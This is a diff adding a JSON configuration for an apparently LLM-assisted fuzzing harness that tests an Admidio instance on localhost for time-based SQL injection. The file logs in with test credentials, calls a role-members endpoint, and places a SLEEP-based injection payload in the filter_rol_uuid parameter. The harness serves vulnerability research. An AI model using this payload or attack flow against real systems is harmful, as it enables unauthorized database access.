@@ -1,0 +1,64 @@
+{
+  "base_url": "http://localhost:3100",
+  "session_flow": [
+    {
+      "step": 1,
+      "name": "fetch_csrf_token",
+      "method": "GET",
+      "url": "/adm_program/overview.php",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "Referer": "http://localhost:3100/adm_program/overview.php"
+      },
+      "extract": {
+        "csrf_token": "HTML element with id='admidio-csrf-token', attribute 'value'"
+      }
+    },
+    {
+      "step": 2,
+      "name": "login",
+      "method": "POST",
+      "url": "/adm_program/system/login.php?mode=check",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "Referer": "http://localhost:3100/adm_program/overview.php"
+      },
+      "body": {
+        "admidio-csrf-token": "<extracted_csrf_token>",
+        "plg_usr_login_name": "Jack",
+        "plg_usr_password": "Jack.123456",
+        "next_page": ""
+      }
+    },
+    {
+      "step": 3,
+      "name": "query_role_members",
+      "method": "GET",
+      "url": "/adm_program/modules/groups-roles/members_assignment_data.php",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "Referer": "http://localhost:3100/adm_program/modules/groups-roles/members_assignment_data.php"
+      },
+      "params": {
+        "role_uuid": "c3e251ba-9754-4b61-957b-c04118e2384d",
+        "draw": "<draw>",
+        "start": "<start>",
+        "length": "<length>",
+        "search[value]": "<search[value]>",
+        "mem_show_all": "<mem_show_all>",
+        "filter_rol_uuid": "x' OR (SELECT SLEEP(5)) AND '1'='1",
+        "XDEBUG_TRIGGER": 1
+      }
+    }
+  ],
+  "allowed_llm_params": [
+    "draw",
+    "start",
+    "length",
+    "search[value]",
+    "mem_show_all",
+    "filter_rol_uuid"
+  ],
+  "time_based_injection_threshold_seconds": 1.0,
+  "fuzz_params_file": "fuzz_params.json"
+}
